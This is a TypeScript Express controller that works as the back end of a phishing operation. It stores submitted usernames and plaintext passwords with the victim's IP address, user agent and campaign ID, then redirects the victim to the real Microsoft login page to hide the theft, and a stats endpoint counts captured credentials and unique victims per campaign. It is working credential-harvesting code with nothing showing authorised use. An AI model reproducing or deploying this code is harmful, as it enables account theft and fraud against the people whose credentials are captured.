import { Request, Response } from 'express';
import { Credential } from '../models/credential.model';

export const credentialController = {
  async create(req: Request, res: Response) {
    try {
      const { username, password } = req.body;
      const credential = new Credential({
        username,
        password,
        ipAddress: req.ip,
        userAgent: req.headers['user-agent'],
        campaign: req.body.campaignId
      });
      
      await credential.save();
      
      // Přesměrování na skutečnou stránku služby
      res.status(201).json({ 
        redirect: 'https://login.microsoftonline.com'
      });
    } catch (error) {
      console.error('Error saving credentials:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  },

  async getStats(req: Request, res: Response) {
    try {
      const stats = await Credential.aggregate([
        {
          $group: {
            _id: '$campaign',
            count: { $sum: 1 },
            uniqueUsers: { $addToSet: '$username' }
          }
        }
      ]);
      
      res.json(stats);
    } catch (error) {
      res.status(500).json({ error: 'Error fetching statistics' });
    }
  }
};